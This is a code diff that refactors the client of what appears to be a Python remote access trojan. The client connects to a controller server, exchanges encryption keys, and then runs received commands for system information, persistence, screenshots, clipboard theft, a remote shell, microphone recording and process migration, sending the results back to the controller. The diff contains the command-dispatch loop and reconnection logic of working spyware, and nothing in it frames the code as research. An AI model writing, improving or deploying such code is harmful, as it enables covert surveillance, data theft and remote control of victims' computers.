@@ -23,6 +23,12 @@ import threading
 import pyperclip
 import os
 
+# Global symmetric key used for encryption helpers
+symmetric_key = b""
+
+# Default server information
+srv_ip, srv_port = '127.0.0.1', 5555  # SETUP SCRIPT WILL UPDATE THIS VALUE (DO NOT DELETE THIS COMMENT)
+
 def start_diffie_hellman_exchange(conn_obj, bits=2048):
     """Perform the client side of the Diffie-Hellman exchange."""
 
@@ -535,68 +541,84 @@ def del_persistence(win_flag):
         except:
             return "fail"
 
-# Required Variables
-srv_ip, srv_port = '127.0.0.1', 5555 # SETUP SCRIPT WILL UPDATE THIS VALUE (DO NOT DELETE THIS COMMENT)
-stop_flag = threading.Event() 
-
-conn_obj = connect_server(srv_ip, srv_port)
-conn_obj.settimeout(10**6) 
-
-print("[+] Connected to server") # debugging (to delete)
-
-# Encyrption setup
-symmetric_key = attempt_exchange(conn_obj)
-if symmetric_key is None: exit()
-        
-while True:
+def main():
+    global symmetric_key
+    stop_flag = threading.Event()
+    conn_obj = None
     try:
-        server_message = conn_obj.recv(4096).strip()
-        server_message = decrypt_message(server_message)
-        
-        if server_message not in ["sys_info", "persist", "del_persist", "screenshot", "clipboard_steal", "shell", "kill", "mic_record", "migrate"]:
-            conn_obj.sendall(encrypt_message("retry"))
-            server_message = decrypt_message(conn_obj.recv(4096))
-        elif server_message == "kill":
-            break
+        conn_obj = connect_server(srv_ip, srv_port)
+        conn_obj.settimeout(10**6)
 
-    except (ConnectionAbortedError, ConnectionResetError, ConnectionError, EOFError):
-        conn_obj, symmetric_key = reconnect_server(srv_ip, srv_port, conn_obj)
-        conn_obj.settimeout(60)
-    except s.timeout:
-        break   
-    
-    output = "No information gathered" 
-    try:
-        if server_message == "sys_info":
-            output = system_information()
-        elif server_message == "persist":
-            output = create_persistence(win_flag)
-        elif server_message == "del_persist":
-            output = del_persistence(win_flag)
-        elif server_message == "screenshot":
-            output = take_screenshot(conn_obj)
-        elif server_message == "clipboard_steal":
-            output = clipboard_main(conn_obj)
-        elif server_message == "shell":
-            shell_command(conn_obj)
-    except (ConnectionAbortedError, ConnectionResetError, ConnectionError, EOFError):
-        conn_obj, symmetric_key = reconnect_server(srv_ip, srv_port, conn_obj)
-        conn_obj.settimeout(60)
-    finally:
-        if not output:
-            output == "No information gathered"
-        if server_message != "shell":
-            output = encrypt_message(output)
-            conn_obj.sendall(output)
-        clear_socket_buffer(conn_obj)
+        symmetric_key = attempt_exchange(conn_obj)
+        if symmetric_key is None:
+            return
 
-try:   
-    conn_obj.sendall(encrypt_message("shutdown_confirmed"))     
-    conn_obj.close()
-except:
-    try:
-        conn_obj.sendall(encrypt_message("connection_not_closed")) 
-    except:
+        while True:
+            try:
+                server_message = conn_obj.recv(4096).strip()
+                server_message = decrypt_message(server_message)
+
+                if server_message not in [
+                    "sys_info",
+                    "persist",
+                    "del_persist",
+                    "screenshot",
+                    "clipboard_steal",
+                    "shell",
+                    "kill",
+                    "mic_record",
+                    "migrate",
+                ]:
+                    conn_obj.sendall(encrypt_message("retry"))
+                    server_message = decrypt_message(conn_obj.recv(4096))
+                elif server_message == "kill":
+                    break
+
+            except (ConnectionAbortedError, ConnectionResetError, ConnectionError, EOFError):
+                conn_obj, symmetric_key = reconnect_server(srv_ip, srv_port, conn_obj)
+                conn_obj.settimeout(60)
+                continue
+            except s.timeout:
+                break
+
+            output = "No information gathered"
+            try:
+                if server_message == "sys_info":
+                    output = system_information()
+                elif server_message == "persist":
+                    output = create_persistence(win_flag)
+                elif server_message == "del_persist":
+                    output = del_persistence(win_flag)
+                elif server_message == "screenshot":
+                    output = take_screenshot(conn_obj)
+                elif server_message == "clipboard_steal":
+                    output = clipboard_main(conn_obj)
+                elif server_message == "shell":
+                    shell_command(conn_obj)
+            except (ConnectionAbortedError, ConnectionResetError, ConnectionError, EOFError):
+                conn_obj, symmetric_key = reconnect_server(srv_ip, srv_port, conn_obj)
+                conn_obj.settimeout(60)
+            finally:
+                if server_message != "shell":
+                    conn_obj.sendall(encrypt_message(output))
+                clear_socket_buffer(conn_obj)
+
+    except Exception:
         pass
-finally:
-    exit()
+    finally:
+        if conn_obj:
+            try:
+                conn_obj.sendall(encrypt_message("shutdown_confirmed"))
+                conn_obj.close()
+            except Exception:
+                try:
+                    conn_obj.sendall(encrypt_message("connection_not_closed"))
+                except Exception:
+                    pass
+
+
+if __name__ == "__main__":
+    try:
+        main()
+    except Exception:
+        pass
